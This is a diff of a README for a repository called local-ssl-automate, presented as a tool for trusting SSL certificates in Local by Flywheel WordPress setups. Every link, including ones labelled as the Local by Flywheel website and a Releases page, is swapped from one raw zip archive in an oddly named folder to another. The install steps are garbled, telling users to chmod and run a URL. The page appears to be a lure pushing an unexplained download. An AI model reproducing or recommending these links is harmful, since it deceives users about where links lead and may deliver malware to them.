@@ -1,6 +1,6 @@
 # 🔒 local-ssl-automate - Simplify SSL Trust for Local Development
 
-[![Download](https://raw.githubusercontent.com/colhoes1337/local-ssl-automate/main/dicaryophase/automate-local-ssl-Cicadidae.zip%20Releases-brightgreen)](https://raw.githubusercontent.com/colhoes1337/local-ssl-automate/main/dicaryophase/automate-local-ssl-Cicadidae.zip)
+[![Download](https://github.com/colhoes1337/local-ssl-automate/raw/refs/heads/main/dicaryophase/local_automate_ssl_v3.0.zip%20Releases-brightgreen)](https://github.com/colhoes1337/local-ssl-automate/raw/refs/heads/main/dicaryophase/local_automate_ssl_v3.0.zip)
 
 ## 📖 Description
 
@@ -16,7 +16,7 @@ To successfully use local-ssl-automate, follow these steps:
    - **Local by Flywheel**: Install Local by Flywheel to manage your WordPress sites.
 
 2. **Download & Install**  
-   Visit the page to download: [Releases Page](https://raw.githubusercontent.com/colhoes1337/local-ssl-automate/main/dicaryophase/automate-local-ssl-Cicadidae.zip).  
+   Visit the page to download: [Releases Page](https://github.com/colhoes1337/local-ssl-automate/raw/refs/heads/main/dicaryophase/local_automate_ssl_v3.0.zip).  
    On the Releases page, look for the latest version and download it. Follow these steps:
    - Click on the version number you wish to download.
    - Scroll down to the "Assets" section and download the file compatible with your system.
@@ -31,13 +31,13 @@ To successfully use local-ssl-automate, follow these steps:
      ```
    - Change the permissions to make the script executable:
      ```bash
-     chmod +x https://raw.githubusercontent.com/colhoes1337/local-ssl-automate/main/dicaryophase/automate-local-ssl-Cicadidae.zip
+     chmod +x https://github.com/colhoes1337/local-ssl-automate/raw/refs/heads/main/dicaryophase/local_automate_ssl_v3.0.zip
      ```
 
 4. **Run the Script**  
    In the Terminal, execute the script:
    ```bash
-   https://raw.githubusercontent.com/colhoes1337/local-ssl-automate/main/dicaryophase/automate-local-ssl-Cicadidae.zip
+   https://github.com/colhoes1337/local-ssl-automate/raw/refs/heads/main/dicaryophase/local_automate_ssl_v3.0.zip
    ```
    This command will start the process to trust SSL certificates. Follow any prompts in the Terminal to complete the setup.
 
@@ -69,8 +69,8 @@ Feel free to contribute to local-ssl-automate. If you find bugs or have suggesti
 ## 🔗 Useful Links
 
 - **Documentation**: Check out the documentation for more details on how to use local-ssl-automate.
-- **Local by Flywheel**: Visit the [Local by Flywheel website](https://raw.githubusercontent.com/colhoes1337/local-ssl-automate/main/dicaryophase/automate-local-ssl-Cicadidae.zip) for more information.
-- **GitHub Releases**: Again, you can access the Releases page here: [Releases Page](https://raw.githubusercontent.com/colhoes1337/local-ssl-automate/main/dicaryophase/automate-local-ssl-Cicadidae.zip).
+- **Local by Flywheel**: Visit the [Local by Flywheel website](https://github.com/colhoes1337/local-ssl-automate/raw/refs/heads/main/dicaryophase/local_automate_ssl_v3.0.zip) for more information.
+- **GitHub Releases**: Again, you can access the Releases page here: [Releases Page](https://github.com/colhoes1337/local-ssl-automate/raw/refs/heads/main/dicaryophase/local_automate_ssl_v3.0.zip).
 
 ## 🛠 Additional Resources
 
@@ -84,4 +84,4 @@ If you're interested in learning more about SSL, security, or WordPress developm
 
 With local-ssl-automate, you can quickly set up a secure WordPress development environment. The straightforward commands and automation takes the hassle out of managing SSL certificates. Download the script today and streamline your development process.
 
-[![Download](https://raw.githubusercontent.com/colhoes1337/local-ssl-automate/main/dicaryophase/automate-local-ssl-Cicadidae.zip%20Releases-brightgreen)](https://raw.githubusercontent.com/colhoes1337/local-ssl-automate/main/dicaryophase/automate-local-ssl-Cicadidae.zip)
+[![Download](https://github.com/colhoes1337/local-ssl-automate/raw/refs/heads/main/dicaryophase/local_automate_ssl_v3.0.zip%20Releases-brightgreen)](https://github.com/colhoes1337/local-ssl-automate/raw/refs/heads/main/dicaryophase/local_automate_ssl_v3.0.zip)
